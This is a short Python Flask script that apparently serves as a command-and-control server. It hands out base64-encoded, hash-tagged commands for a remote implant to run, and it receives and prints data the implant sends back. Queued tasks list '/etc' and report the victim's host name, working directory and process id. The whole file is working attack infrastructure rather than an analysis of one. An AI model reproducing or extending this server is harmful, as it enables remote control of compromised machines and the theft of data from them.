import hashlib
import base64
from flask import Flask, request
# import ssl

PORT = 9998
active = "passive"

cmds = []

app = Flask(__name__)

@app.get("/commands")
def serve_commands():
    """Serve activce commands

    Returns:
        string: list of commands
    """
    if active == "active":
        page = "active\n"
    else:
        page = "passive\n" 
    for cmd in cmds:
        hash = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
        page += f"{cmd}:{hash}\n"
    page = base64.urlsafe_b64encode(bytes(page.encode('utf-8')))
    return page

@app.post("/data")
def recieve_data():
    """Recieve post request containing data

    Returns:
        string: blank page, 200 code
    """
    data = base64.urlsafe_b64decode(bytes(request.data))
    print(str(data, "utf-8"))
    return "", 200


if __name__ == "__main__":
    cmds.append("password:ls:/etc")
    cmds.append("password:BUILTIN:name")
    cmds.append("password:BUILTIN:cwd")
    cmds.append("password:BUILTIN:pid")

    app.run(host="localhost", port=PORT, debug=True)